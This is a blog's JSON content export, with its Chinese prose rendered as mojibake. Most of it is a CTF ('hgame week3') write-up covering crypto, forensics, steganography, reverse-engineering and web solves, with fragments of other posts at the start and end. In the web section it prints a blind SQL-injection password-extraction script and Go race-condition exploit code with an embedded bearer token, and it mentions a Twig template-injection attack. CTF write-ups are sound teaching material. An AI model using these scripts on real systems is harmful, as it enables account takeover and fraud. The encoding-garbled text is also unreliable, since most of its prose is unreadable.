æ€»ç»“è¿™ç¯‡åšå®¢ç®€å•æ€»ç»“äº†ä¸‹xxeçš„åŸºç¡€çŸ¥è¯†ï¼Œå®é™…ä¸Šï¼Œxxeè¿˜æœ‰å…¶ä»–çš„ç”¨é€”ï¼Œä¾‹å¦‚æ¢æµ‹å†…ç½‘ã€RCEã€DOSç­‰éƒ½å¯ä»¥ç”¨ä¸Šï¼Œå› æ­¤xxeè¿˜æ˜¯ååˆ†å¥½ç”¨çš„ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XXE","slug":"web-XXE","permalink":"http://example.com/tags/web-XXE/"}]},{"title":"ã€hgame week3ã€‘write up","slug":"ã€hgame-week3ã€‘write-up","date":"2022-02-11T13:27:12.000Z","updated":"2022-02-11T13:27:57.177Z","comments":true,"path":"2022/02/11/ã€hgame-week3ã€‘write-up/","link":"","permalink":"http://example.com/2022/02/11/%E3%80%90hgame-week3%E3%80%91write-up/","excerpt":"å‰è¨€ç¬¬ä¸‰å‘¨é¢˜é‡ä¸å¤šï¼Œè¿˜æ˜¯æ²¡æ‘†çƒ‚æ‘†ä¸‹å»ã€‚","text":"å‰è¨€ç¬¬ä¸‰å‘¨é¢˜é‡ä¸å¤šï¼Œè¿˜æ˜¯æ²¡æ‘†çƒ‚æ‘†ä¸‹å»ã€‚ CRYPTOBlock Cipherè€ƒç‚¹åœ¨äºå­—èŠ‚æµè½¬æ¢ä»¥åŠåˆ†ç»„åŠ å¯†: 12345678910111213141516171819202122232425262728293031import operatorimport randomimport refrom functools import reducefrom secret import flagdef pad(s): padding_length = (8 - len(s)) % 8 return s + chr(padding_length) * padding_lengthdef xor(a, b): assert len(a) == len(b) return bytes(map(operator.xor, a, b))def encrypt(s): iv = bytes(random.randint(0, 255) for _ in range(8)) key = bytes(random.randint(0, 255) for _ in range(8)) parts = list(map(str.encode, map(pad, re.findall(r&#x27;.&#123;1,8&#125;&#x27;, s)))) results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else results[-1], key])) return iv, key, resultsiv, key, parts = encrypt(flag)print(f&quot;iv = &#123;iv&#125;&quot;)print(f&quot;key = &#123;key&#125;&quot;)print(f&quot;parts = &#123;parts&#125;&quot;) åŠ å¯†é€»è¾‘å°±æ˜¯å°†flagåˆ†æˆ8ä½1partï¼Œç„¶åç¬¬ä¸€ä½å’Œivå’Œkeyå¼‚æˆ–ï¼Œç¬¬äºŒä½å’Œkeyä»¥åŠç¬¬ä¸€æ¬¡å¼‚æˆ–ç»“æœï¼Œä»¥æ­¤ç±»æ¨ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦å°†å­—èŠ‚æµè½¬æ¢å›æ•´å½¢è¿›è¡Œåå‘å¼‚æˆ–å³å¯ã€‚ç¼–å†™è„šæœ¬ï¼š 123456789101112131415iv = b&#x27;Up\\x14\\x98r\\x14%\\xb9&#x27;key = b&#x27;\\r\\xe8\\xb86\\x9c33^&#x27;parts = [b&#x27;0\\xff\\xcd\\xc3\\x8b\\\\T\\x8b&#x27;, b&#x27;RT\\x1e\\x89t&amp;\\x17\\xbd&#x27;, b&#x27;\\x1a\\xee\\x8d\\xd6\\x9b&gt;w\\x8c&#x27;, b&#x27;9CT\\xb3^pF\\xd0&#x27;]a = int.from_bytes(iv, byteorder=&#x27;big&#x27;)b = int.from_bytes(key, byteorder=&#x27;big&#x27;)c = []for i in parts: c.append(int.from_bytes(i, byteorder=&#x27;big&#x27;))for j in range(0,3): flag = c[3-j]^c[2-j]^b print(hex(flag))d = c[0]^a^bprint(hex(d)) å°†å››æ¬¡è¾“å‡ºç»“æœæ”¾è¿‡æ¥è§£ç åå…­è¿›åˆ¶å³å¯å¾—åˆ°flagï¼š Multi Prime RSARSAçš„å¤šç´ æ•°åŠ å¯†ï¼Œä¸ŠåŠ å¯†è„šæœ¬ï¼š 123456789101112131415161718192021from Crypto.Util.number import getPrimefrom gmpy2 import invertfrom libnum import s2nfrom secret import flag, get_phip = getPrime(256)q = getPrime(256)r = getPrime(256)s = getPrime(256)n = p ** 2 * q ** 3 * r ** 5 * s ** 7phi = get_phi(p, q, r, s)e = 65537c = pow(s2n(flag), e, n)print(f&quot;p = &#123;p&#125;&quot;)print(f&quot;q = &#123;q&#125;&quot;)print(f&quot;r = &#123;r&#125;&quot;)print(f&quot;s = &#123;s&#125;&quot;)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;c = &#123;c&#125;&quot;) è¿™é‡Œè¦è¿ç”¨åˆ°æ¬§æ‹‰å‡½æ•°çš„è®¡ç®—æ–¹æ³•ï¼š æ ¹æ®ä¸Šé¢çš„æ–¹æ³•ç›´æ¥å†™è„šæœ¬è§£RSAï¼š 12345678910111213141516import libnump = 109056753224725357860050862987465749131702509174531265860789564184166504627089q = 64871884070495743485110397060920534297122908609816622599229579748089451488127r = 73817195552029165561107245309535744382442021553254903166961729774806232509583s = 89907870347457693114161779597928900080173728317019344960807644151097370118553n = 337945247991531188630780631650822497552908401425959508214145019590891175999570651678385514599227649321033438265588883204645721459926338248032512615537333971869461679586403649697114789385472197685140603238299768873935137939123021910982793481655218061907401584383081422244812725080939394854989735528833013780919908024635812696998644603525843637686545709789908672408993923182946718279531020289767042649725545073526307769817097790005360720650079676982379162926484355121626302801800589993422729725583400678081766553017405965706770238634252836827793877622715474210575752508172785712202444441372140501379422725172250199713113954442223362073485143579617841236442644760494913432967541691532709842303408702693199269606594116690052170245340072114122287646793344327315326489574192325790848798131621842606487734721409882742631176999703502149639410263361145441889337623403361569958342141903891414217371443118527025041591219747780100510414268546884029077010164415049298406632069845430841542680166802473749172801804659277821899576403669845353379213803866969800665351300325701817179936198902427032684058452719607840314873315299975603264092020097224735237221994922702705781103002327285724125001893421030923788361576161461965707958695720464547129911053732747399113017747456439027947305796290572816318795181398935020951025833913e = 65537c = 281020926647419736778465777714512241989738235339105762863874725870511725155101862585192241287617168165290485944476735304459717602798728005687755713662466866091315959960168862035396245078850168822145228676116894754613436735897122137945552880864031115366493898382809812977280234389519365119627504653135151731589924405933589175425427189436855517194951589952822691774400942764910734054237756669945324833759799471068481769516338068810710333940167779043544371586185132920304774984746129764220081092726473696111126293966890901487735046101991609292612206984184161394385767762455321150541601949740631911175736268756408775307673610842645555513631617648877296855194327486811545670357137463942744122553468603244298691801028147147418563982169678640270746871085722092365159546820433098926679284504740402248142173715649451061037156261913601096905601577932894877435316535261789072594174871292814951406337447799051502635390866434813419165738873787323716033378045850292413169255965421404580559241351577058726176436504950558398769061998430771982995850759810867299728407860522399699076192754977454139708618158667289120827143703464056583125568576691058753072898162981956883451252542611323974071518397220203389962420073122776649094369816178685947397943358134020598211306649724455966463885765977564934172273334309312046278116760547flag = &#x27;&#x27;phi = (p**2-p)* (q**3-q**2) * (r**5-r**4) * (s**7-s**6)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) è§£å¾—flagï¼š RSA Attack 3è¿™é¢˜è¦åˆ©ç”¨åˆ°RSAä¸­çš„wiener-attackï¼Œç‰¹å¾æ˜¯eçš„å€¼éå¸¸å¤§ï¼Œè¿™å°±å¯¼è‡´äº†dçš„å€¼ä¼šæ¯”è¾ƒå°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ç›¸å…³å·¥å…·ç ´è§£ã€‚è¿™é‡Œä»ç½‘ä¸Šç äº†ä¸€ä¸ªå®Œæ•´çš„è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344import gmpy2import libnumdef continuedFra(x, y): cf = [] while y: cf.append(x // y) x, y = y, x % y return cfdef gradualFra(cf): numerator = 0 denominator = 1 for x in cf[::-1]: numerator, denominator = denominator, x * denominator + numerator return numerator, denominatordef solve_pq(a, b, c): par = gmpy2.isqrt(b * b - 4 * a * c) return (-b + par) // (2 * a), (-b - par) // (2 * a)def getGradualFra(cf): gf = [] for i in range(1, len(cf) + 1): gf.append(gradualFra(cf[:i])) return gfdef wienerAttack(e, n): cf = continuedFra(e, n) gf = getGradualFra(cf) for d, k in gf: if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k p, q = solve_pq(1, n - phi + 1, n) if p * q == n: return dn= 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759e= 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095c= 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224d=wienerAttack(e, n)m=pow(c, d, n)print(libnum.n2s(m).decode()) å¾—å‡ºflagï¼š MISCå¡ä¸­æ¯’å†…å­˜å–è¯ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ä¸Šæ‰‹ï¼Œå·¥å…·è£…äº†è›®ä¹…çš„ï¼Œæœ‰ç‚¹éº»ï¼Œä½†æ˜¯é¢˜ç›®æœ¬èº«ä¸éš¾ã€‚ é¦–å…ˆåŸºæœ¬æ“ä½œï¼ŒæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼š çœ‹å‡ºæ“ä½œç³»ç»Ÿæ˜¯win7sp1x64ï¼Œæ¥ç€æ ¹æ®æç¤ºå†…å®¹ï¼ŒæŸ¥çœ‹ieæµè§ˆè®°å½•ï¼š å‘ç°flagæ–‡ä»¶ï¼Œæ ¼å¼ä¸º7zï¼Œæœç´¢æ–‡ä»¶ä½ç½®ï¼š æ ¹æ®æ–‡ä»¶ä½ç½®è·å–æ–‡ä»¶ï¼š æ‰“å¼€åå‘ç°ä¸€ä¸ªWannaRenç—…æ¯’åŠ å¯†çš„txtæ–‡ä»¶ï¼š åˆ©ç”¨ç«ç»’WannaRenè§£å¯†å·¥å…·è¿›è¡Œè§£å¯†åï¼Œå‘ç°txtæ–‡ä»¶ä¸­æ˜¯ä¸€ä¸²æ–°ä¸ä½›è®ºç¦…å¯†ç ï¼Œè§£ç å³å¯å¾—åˆ°flagï¼š è°ä¸å–œæ¬¢çŒ«çŒ«å‘¢é™„ä»¶æ˜¯ä¸€å¼ ç”˜åŸçŒ«çŒ«çš„æ–°å›¾ï¼Œçˆ±äº†çˆ±äº†ã€‚010ç¿»åˆ°æœ€åå‘ç°è—æœ‰å‹ç¼©åŒ…ï¼Œç›´æ¥æ”¹åç¼€æå–ä¸¤ä¸ªtxtæ–‡ä»¶ï¼š å‘ç°æ˜¯ä¸¤ä¸ªtxtæ–‡ä»¶ä¸­éƒ½æ˜¯9ä¸ªæ•°å­—ï¼Œè¿™é‡Œå°è¯•æŠŠä¸¤ä¸ªæ–‡æ¡£ä¸­ä½ç½®å¯¹åº”çš„æ•°å­—åŠ èµ·æ¥è½¬æ¢æˆ2è¿›åˆ¶å‘ç°å¯ä»¥å¾—å‡ºflagå¤´ï¼Œå› æ­¤è¿›è¡Œè½¬æ¢ï¼š 123456list1 = [776686, 749573, 6395443, 2522866, 279584, 587965, 4012670, 1645156, 2184634]list2 = [6065523, 6419830, 1421837, 5103682, 5963053, 2842996, 1113825, 1594064, 4578755]for i in range(0,9): result = list1[i]+list2[i] print(&#x27;&#123;:024b&#125;&#x27;.format(result)) ç»“æœï¼š åšä¸€æ¬¡äºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flagï¼š è¿™é‡Œåšä¸‹èµ›åè¡¥å……ï¼Œä¸Šè¿°åšæ³•æ˜¯ç›´æ¥å°è¯•å‡ºæ¥çš„ï¼Œä½†æ˜¯é¢„æœŸè§£æ³•ä¸­ä¼šç›´æ¥æç¤ºä½ è¦åšåŠ æ³•è¿ç®—ã€‚ é¦–å…ˆå‘ç°å›¾ä¸Šæœ‰å¼‚å¸¸åƒç´ ï¼Œç”¨pythonè„šæœ¬è¿›è¡Œæå–ï¼š 12345678910111213from PIL import Imagex, y = 0, 0a = Image.open(&quot;cat.png&quot;)flag = Image.new(&quot;RGB&quot;, (214, 214))for w in range(4, a.size[0] -10 , 11): for h in range(4, a.size[1]-10 , 11): r, g, b, _ = a.getpixel((w + 1, h + 1)) rgba = flag.putpixel((x, y), (r, g, b)) y += 1 x += 1 y = 0flag.save(&quot;data.png&quot;) å¾—åˆ°å›¾1ï¼š è§‚å¯Ÿå‘ç°æ¯ä¸ªå¸¦é¢œè‰²çš„ç‚¹éƒ½é—´éš”4åƒç´ ç‚¹ï¼Œç”±æ­¤ç¼–å‡ºè„šæœ¬ï¼š 123456789101112131415161718from PIL import Imageimg = Image.open(&#x27;26.png&#x27;)width, height = img.sizepixs_list = []for w in range(2, width, 5): for h in range(2, height, 5): pix = img.getpixel((w, h)) pixs_list.append(pix)new_width, new_height = 43, 43new_img = Image.new(&#x27;RGB&#x27;, (new_width, new_height))idx = 0for n_w in range(new_width): for n_h in range(new_height): new_img.putpixel((n_w, n_h), pixs_list[idx]) idx += 1new_img.save(&#x27;27.png&#x27;)new_img.show() å¾—åˆ°å›¾2 wpè¯´è¿™é‡Œè¿ç”¨åˆ°çš„æ˜¯catå˜åŒ–ï¼Œwpé‡Œç»™çš„è„šæœ¬ï¼š 12345678910def arnold_decode(image, a, b): decode_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h for ori_x in range(h): for ori_y in range(w): new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N new_y = ((-a)*ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_image ç½‘ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼š 1234567891011121314151617181920from PIL import Imageimg = Image.open(&#x27;ok1.png&#x27;)if img.mode == &quot;P&quot;: img = img.convert(&quot;RGB&quot;)assert img.size[0] == img.size[1]dim = width, height = img.sizest = 1a = 9b = 39for _ in range(st): with Image.new(img.mode, dim) as canvas: for nx in range(img.size[0]): for ny in range(img.size[0]): y = (ny - nx * a) % width x = (nx - y * b) % height canvas.putpixel((y, x), img.getpixel((ny, nx)))canvas.show()canvas.save(&#x27;28.png&#x27;) å¾—åˆ°å›¾3ï¼š npietè§£å¯†ï¼š å¾—å‡ºåŠ æ³•è¿ç®—ç»“è®ºã€‚ REVERSEcreakme3IDAæœ‰æ’ä»¶æˆ–è€…ç‰ˆæœ¬åˆé€‚çš„è¯å…¶å®å¯ä»¥åæ±‡ç¼–pccçš„ï¼Œè¿™é‡Œå±äºæ˜¯å‡ºé¢˜äººå¤±è¯¯äº†ã€‚é¢˜ç›®ç”¨ç»“æ„ä½“æ•°ç»„ä¿å­˜äº†ä¸€ç»„æ•°æ®ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªintä¸ºå­—ç¬¦çš„ASCIIç ï¼Œç¬¬äºŒä¸ªintä¸ºå­—ç¬¦çš„é¡ºåºï¼Œä½¿ç”¨çŒ´å­æ’åºç®—æ³•æ¥å¯¹æ•°æ®è¿›è¡Œæ’åºï¼Œå¦‚æœæ’åºæˆåŠŸå°±ä¼šè¾“å‡ºflagã€‚ æˆ‘åšçš„æ—¶å€™æ˜¯è‡ªå·±è¯•äº†è¯•å°±æ’å‡ºæ¥äº†ï¼Œæ”¾ä¸ªå®˜æ–¹wpçš„è„šæœ¬å§ï¼š 12345678910111213141516171819202122232425262728struct alpha&#123; int ch; int index;&#125;;struct alpha a[89] =&#123; &#123; 48, 20093 &#125;, &#123; 48, 26557 &#125;, &#123; 48, 31304 &#125;, &#123; 48, 33442 &#125;, &#123; 48, 37694&#125;, &#123; 49, 39960 &#125;, &#123; 50, 23295 &#125;, &#123; 50, 27863 &#125;, &#123; 50, 42698 &#125;, &#123; 50,48505 &#125;, &#123; 50, 52925 &#125;, &#123; 51, 12874 &#125;, &#123; 51, 12946 &#125;, &#123; 51, 14597 &#125;, &#123;51, 17041 &#125;, &#123; 51, 23262 &#125;, &#123; 51, 28319 &#125;, &#123; 51, 42282 &#125;, &#123; 51, 48693 &#125;,&#123; 51, 52067 &#125;, &#123; 53, 32571 &#125;, &#123; 56, 14612 &#125;, &#123; 56, 45741 &#125;, &#123; 57, 14554 &#125;,&#123; 57, 20048 &#125;, &#123; 57, 27138 &#125;, &#123; 57, 45327 &#125;, &#123; 66, 30949 &#125;, &#123; 95, 32502&#125;, &#123; 95, 35235 &#125;, &#123; 95, 36541 &#125;, &#123; 95, 38371 &#125;, &#123; 97, 29658 &#125;, &#123; 100,21388 &#125;, &#123; 100, 25403 &#125;, &#123; 100, 40604 &#125;, &#123; 100, 46987 &#125;, &#123; 100, 51302 &#125;,&#123; 101, 12974 &#125;, &#123; 101, 30329 &#125;, &#123; 102, 10983 &#125;, &#123; 102, 19818 &#125;, &#123; 102,22280 &#125;, &#123; 102, 26128 &#125;, &#123; 102, 41560 &#125;, &#123; 102, 47116 &#125;, &#123; 102, 51333 &#125;,&#123; 103, 28938 &#125;, &#123; 103, 31988 &#125;, &#123; 104, 16246 &#125;, &#123; 104, 28715 &#125;, &#123; 104,41966 &#125;, &#123; 104, 44368 &#125;, &#123; 104, 47815 &#125;, &#123; 105, 16420 &#125;, &#123; 105, 35362 &#125;,&#123; 105, 49237 &#125;, &#123; 106, 11090 &#125;, &#123; 106, 50823 &#125;, &#123; 107, 24320 &#125;, &#123; 107,50199 &#125;, &#123; 108, 24962 &#125;, &#123; 109, 30171 &#125;, &#123; 110, 15457 &#125;, &#123; 110, 18838 &#125;,&#123; 110, 24001 &#125;, &#123; 111, 11638 &#125;, &#123; 111, 32023 &#125;, &#123; 111, 43291 &#125;, &#123; 112,39661 &#125;, &#123; 114, 17872 &#125;, &#123; 114, 33895 &#125;, &#123; 114, 43869 &#125;, &#123; 115, 20611 &#125;,&#123; 115, 25122 &#125;, &#123; 115, 36243 &#125;, &#123; 115, 37434 &#125;, &#123; 115, 38686 &#125;, &#123; 115,46266 &#125;, &#123; 115, 51077 &#125;, &#123; 116, 13656 &#125;, &#123; 116, 34493 &#125;, &#123; 116, 38712 &#125;,&#123; 117, 14096 &#125;, &#123; 117, 38777 &#125;, &#123; 119, 12095 &#125;, &#123; 119, 17629 &#125;, &#123; 123,30945 &#125;, &#123; 125, 40770 &#125;&#125;;#include&lt;stdio.h&gt;int main()&#123; for(int i=0;i&lt;89;i++)&#123; for(int j=0;j&lt;89;j++)&#123; if(a[i].index&lt;a[j].index)&#123; struct alpha temp=a[i]; a[i]=a[j]; a[j]=temp; &#125; &#125; &#125; for(int i=0;i&lt;89;i++)&#123; putchar(a[i].ch); &#125;&#125;//fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame&#123;B0go_50rt_is_s0_stup1d&#125;fh32orh98sdfh23ikjsdf32 flag:hgame{B0go_50rt_is_s0_stup1d} WEBSecurityCenterè¿›å…¥ç½‘é¡µæŸ¥çœ‹æºç ï¼Œå‘ç°æç¤ºinstall.json,æŸ¥çœ‹åå‘ç°ç½‘é¡µæ˜¯twigæ¨¡æ¿ï¼š æµ‹è¯•åå‘ç°åœ¨è·³è½¬ç•Œé¢å­˜åœ¨sstiæ³¨å…¥ï¼Œå°è¯•æ„å»ºtwigçš„payloadæµ‹è¯•ï¼š æµ‹è¯•æˆåŠŸï¼Œæ¥ç€è·å–flagæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œä½†æ˜¯ç”±äºè·å–çš„å†…å®¹ä¸èƒ½å­˜åœ¨hgameï¼Œå› æ­¤è¦ç”¨base64çš„æ–¹å¼è¾“å‡ºï¼Œæ¥ç€è§£ç å¾—åˆ°flagï¼š Vidar shop demoéé¢„æœŸè¿›å…¥ç½‘é¡µæ³¨å†Œè´¦å·åï¼Œå‘ç°ä½™é¢ä¸º9999ï¼Œä½†æ˜¯è´­ä¹°flagéœ€è¦10000ã€‚è§‚å¯Ÿé¡µé¢å‘ç°é™¤äº†flagè¿˜å¯ä»¥è´­ä¹°ä¸€ä¸ª20å…ƒçš„å¾½ç« ï¼Œè´­ä¹°æµç¨‹æ˜¯å…ˆä¸‹è®¢å•ï¼Œå†ä»˜æ¬¾ï¼Œè€Œä¸”ä»˜æ¬¾åå¯ä»¥é€€æ¬¾ã€‚ å°è¯•æŠ“åŒ…åå‘ç°é€€æ¬¾æ˜¯åªéªŒè¯å•†å“idçš„ï¼Œå› æ­¤æˆ‘ä»¬å…ˆä»è®¢å•ï¼Œç„¶åè´­ä¹°20å…ƒçš„å¾½ç« ï¼Œæ¥ç€é€€æ¬¾å¹¶ä¸”æ”¹idï¼Œå°±å¯ä»¥å‘ç°æˆ‘ä»¬é€€æ¬¾äº†ä¸€ä¸ªflagçš„ä»·æ ¼ï¼š æœ€åè´­ä¹°flagï¼Œå¾—åˆ°flagï¼š é¢„æœŸè¿™é¢˜çš„å®é™…è€ƒç‚¹æ˜¯ç«äº‰ä¸Šä¼ ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨é€»è¾‘æ¼æ´å¯¼è‡´äº†éé¢„æœŸã€‚ å…ˆæŸ¥è¯¢å‡ºç”¨æˆ·ä½™é¢ï¼Œç„¶ååˆ›å»ºè®¢å•ï¼Œæœ€åæ›´æ–°ç”¨æˆ·ä½™é¢ï¼ˆä½™é¢å€¼å–è‡ªæŸ¥è¯¢å‡ºçš„ä½™é¢æ‰£é™¤è®¢å•é‡‘é¢ï¼‰ã€‚æ•´ä¸ªè¿‡ç¨‹æŒç»­äº†è¶…è¿‡500msï¼ˆæ­£å¸¸ä¸ä¼šè¿™ä¹ˆæ…¢ï¼Œç‰¹åœ°sleepæ˜¯ä¸ºäº†æ–¹ä¾¿åšé¢˜ï¼‰ã€‚æ‰€ä»¥å‡å¦‚åœ¨500mså†…æœ‰åŒä¸€ä¸ªç”¨æˆ·çš„å¤šä¸ªä¸åŒè®¢å•çš„æ”¯ä»˜è¯·æ±‚æ‰“è¿›æ¥ï¼Œä¸å¦¨å‡è®¾æŸ¥è¯¢åˆ°çš„ç”¨æˆ·ä½™é¢éƒ½æ˜¯100å¸ï¼ˆå› ä¸ºè¿˜æ²¡è¶…è¿‡500msï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚è¿˜æœªæ›´æ–°ç”¨æˆ·ä½™é¢ï¼‰ï¼Œé‚£ä¹ˆæœ€ç»ˆçš„ç»“æœæ˜¯è®¢å•å…¨éƒ¨æ”¯ä»˜æˆåŠŸï¼Œä½†æ˜¯ç”¨æˆ·çš„ä½™é¢ä»…ä»…æ›´æ–°ä¸ºäº†(100-æœ€åä¸€ä¸ªè®¢å•é‡‘é¢)ã€‚æœ€åå†æ‰‹åŠ¨ä¾æ¬¡å–æ¶ˆæ”¯ä»˜æˆåŠŸçš„è®¢å•ï¼Œä½™é¢å°±ä¼šå˜å¤šã€‚ expï¼š 1234567891011121314151617181920212223type Ts struct &#123; Uid int `json:&quot;uid&quot;` Oid int `json:&quot;oid&quot;` Amount int `json:&quot;amount&quot;`&#125;func TestHgame(T *testing.T) &#123; var ts Ts ts.Uid = 1 ts.Oid = 7 ts.Amount = 5 go gorequest.New().Post(&quot;http://127.0.0.1:8003/apipay/create&quot;). Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;). SendStruct(&amp;ts).End() var ts2 Ts ts2.Uid = 1 ts2.Oid = 8 ts2.Amount = 5 go gorequest.New().Post(&quot;http://127.0.0.1:8003/api/paycreate&quot;). Set(&quot;Authorization&quot;, &quot;bearereyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDM3NTAyNjEsImlhdCI6MTY0MzY2Mzg2MSwidWlkIjoxfQ.b1QV-ubi277QQobG9sS-T4XKq0P78wGMlKZ3aQTFiNE&quot;). SendStruct(&amp;ts2).End() time.Sleep(5 * time.Second)&#125; LoginMeè¿›ç½‘é¡µç›´æ¥ç»™äº†testçš„è´¦å·å¯†ç ï¼Œç™»é™†å‘ç°éœ€è¦adminçš„è´¦å·å¯†ç æ‰èƒ½è·å–flagã€‚è¿˜ç»™äº†hintï¼š è¿™é¢˜è¦ç”¨likeæ¨¡ç³ŠæŸ¥è¯¢æ¥è¿›è¡Œsqlæ³¨å…¥ï¼Œçˆ†å‡ºå¯†ç ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‘ç‚¹å°±æ˜¯postæ—¶æ•°æ®æ˜¯ä»¥jsonä¸Šä¼ çš„ï¼Œåˆšå¼€å§‹æ³¨çš„æ—¶å€™å¿˜è®°äº†è¿™ç‚¹å¯¼è‡´ä¸€ç›´å¤±è´¥ï¼Œç¼–å†™è„šæœ¬ï¼š 123456789101112131415161718192021222324252627import requestsimport stringimport jsonstrs = string.printableurl = &quot;http://339a4b1eda.login.summ3r.top:60067/login&quot;s = requests.session()headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: payload = f&quot;admin&#x27; and password like &#x27;&#123;name+j&#125;%&quot; data = &#123; &quot;username&quot;: payload, &quot;password&quot;: &quot;text&quot; &#125; r = s.post(url=url, data=json.dumps(data), headers=headers) if &quot;success&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break çˆ†å‡ºå¯†ç ï¼š æœ€åç™»å½•å³å¯æ‹¿åˆ°flagï¼š","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"popé“¾çš„æ„å»º","slug":"popé“¾çš„æ„å»º","date":"2022-02-09T08:04:47.000Z","updated":"2022-02-09T13:25:44.525Z","comments":true,"path":"2022/02/09/popé“¾çš„æ„å»º/","link":"","permalink":"http://example.com/2022/02/09/pop%E9%93%BE%E7%9A%84%E6%9E%84%E5%BB%BA/","excerpt":"å‰è¨€ ååºåˆ—åŒ–plusä¹‹popé“¾çš„æ„å»ºï¼Œè¶å¯’å‡è¿˜æœ‰ç‚¹æ—¶é—´å°±ç»§ç»­å­¦ä¹ ä¸‹ã€‚","text":"å‰è¨€ ååºåˆ—åŒ–plusä¹‹popé“¾çš„æ„å»ºï¼Œè¶å¯’å‡è¿˜æœ‰ç‚¹æ—¶é—´å°±ç»§ç»­å­¦ä¹ ä¸‹ã€‚ ä»€ä¹ˆæ˜¯popé“¾åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„æ•°æ®å°±æ˜¯å¯¹è±¡ä¸­çš„å±æ€§å€¼ï¼Œæ‰€ä»¥åœ¨PHPååºåˆ—åŒ–ä¸­æœ‰ä¸€ç§æ¼æ´åˆ©ç”¨æ–¹æ³•å«â€é¢å‘å±æ€§ç¼–ç¨‹â€ï¼Œå³POP(Property Oriented Programming)ã€‚ 